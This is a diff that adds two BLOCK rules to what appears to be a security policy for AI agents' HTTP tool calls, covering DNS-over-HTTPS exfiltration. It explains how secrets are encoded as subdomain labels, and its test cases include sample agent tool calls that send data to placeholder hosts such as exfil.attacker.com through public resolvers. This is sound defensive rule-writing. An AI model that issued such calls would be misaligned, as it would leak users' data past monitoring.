@@ -397,6 +397,108 @@ structural_rules:
         - tool: "fetch_url"
           args: {"url": "https://api.example.com/data?page=1&limit=50"}
 
+  # === BLOCK: DNS-over-HTTPS (DoH) exfiltration endpoints ===
+  #
+  # AI agents have no legitimate need to call DoH resolver APIs. These endpoints
+  # are a primary exfiltration channel: data is encoded as subdomain labels
+  # (e.g., base32(secret).attacker.com) and tunneled via HTTPS to a public DNS
+  # resolver, bypassing all DNS-layer monitoring and traditional URL block lists.
+  # The destination (e.g., dns.google, 1.1.1.1) appears legitimate, making
+  # this channel invisible to naive URL-pattern filters.
+  #
+  # Taxonomy: data-exfiltration/network-egress/dns-over-https-exfiltration
+  # MITRE T1071.004 (Application Layer Protocol: DNS), T1048.003 (Exfil over HTTPS)
+  # Shell equivalents: ne-block-doh-exfil-google, ne-block-doh-exfil-cloudflare, etc.
+  - id: mcp-data-exfil-block-doh-endpoints
+    match:
+      tool_name_any:
+        - "fetch_url"
+        - "fetch"
+        - "browse_web"
+        - "get_webpage"
+        - "http_get"
+        - "http_request"
+        - "http_post"
+        - "post_request"
+        - "make_request"
+        - "network_request"
+        - "web_fetch"
+        - "scrape_url"
+        - "browser_navigate"
+      args_match:
+        url:
+          pattern_any:
+            - "(?i)dns\\.google/(?:resolve|dns-query)"
+            - "(?i)cloudflare-dns\\.com/dns-query"
+            - "(?i)(?:1\\.1\\.1\\.1|1\\.0\\.0\\.1)/dns-query"
+            - "(?i)dns\\.quad9\\.net/dns-query"
+            - "(?i)(?:8\\.8\\.8\\.8|8\\.8\\.4\\.4)/resolve"
+            - "(?i)doh\\.opendns\\.com/dns-query"
+            - "(?i)doh\\.dns\\.sb/dns-query"
+            - "(?i)dns\\.sb/dns-query"
+            - "(?i)mozilla\\.cloudflare-dns\\.com/dns-query"
+            - "(?i)doh\\.cleanbrowsing\\.org/doh/"
+    decision: "BLOCK"
+    reason: "MCP HTTP tool targeting a DNS-over-HTTPS resolver endpoint — AI agents have no legitimate need to call DoH APIs. Data exfiltrated as subdomain labels (e.g., base32(secret).attacker.com) tunneled through HTTPS bypasses all DNS-layer monitoring. MITRE T1071.004, T1048.003."
+    confidence: 0.95
+    tests:
+      tp:
+        - tool: "http_request"
+          args: {"url": "https://dns.google/resolve?name=exfil.attacker.com&type=TXT"}
+        - tool: "fetch_url"
+          args: {"url": "https://cloudflare-dns.com/dns-query?name=stolen.evil.com"}
+        - tool: "http_get"
+          args: {"url": "https://1.1.1.1/dns-query?name=secret.attacker.com"}
+        - tool: "make_request"
+          args: {"url": "https://dns.quad9.net/dns-query?dns=abc123"}
+        - tool: "fetch_url"
+          args: {"url": "https://doh.opendns.com/dns-query?name=data.evil.com"}
+      tn:
+        - tool: "http_request"
+          args: {"url": "https://api.github.com/repos/owner/repo"}
+        - tool: "fetch_url"
+          args: {"url": "https://www.cloudflare.com/learning/dns/"}
+
+  # === BLOCK: DoH requests via application/dns content-type header ===
+  #
+  # Any HTTP tool call using the DoH wire format content types is a DoH request,
+  # regardless of the destination hostname. Catches custom DoH servers and
+  # self-hosted resolver endpoints not covered by the hostname allowlist above.
+  # MITRE T1071.004, T1048.003
+  - id: mcp-data-exfil-block-doh-content-type
+    match:
+      tool_name_any:
+        - "fetch_url"
+        - "fetch"
+        - "http_get"
+        - "http_request"
+        - "http_post"
+        - "post_request"
+        - "make_request"
+        - "network_request"
+        - "web_fetch"
+      args_match:
+        headers:
+          pattern_any:
+            - "(?i)application/dns-json"
+            - "(?i)application/dns-message"
+        accept:
+          pattern_any:
+            - "(?i)application/dns-json"
+            - "(?i)application/dns-message"
+    decision: "BLOCK"
+    reason: "MCP HTTP tool request using DNS-over-HTTPS wire format content type (application/dns-json or application/dns-message) — indicates a DoH resolver call regardless of destination, used to exfiltrate data as DNS queries tunneled through HTTPS. MITRE T1071.004, T1048.003."
+    confidence: 0.93
+    tests:
+      tp:
+        - tool: "http_request"
+          args: {"url": "https://custom-doh.attacker.com/dns", "headers": {"accept": "application/dns-json"}}
+        - tool: "fetch_url"
+          args: {"url": "https://resolver.example.com/query", "accept": "application/dns-message"}
+      tn:
+        - tool: "http_request"
+          args: {"url": "https://api.github.com/repos/owner/repo", "headers": {"accept": "application/json"}}
+
 resource_rules:
   # === AUDIT: resources/read — external HTTP/HTTPS URIs ===
   #
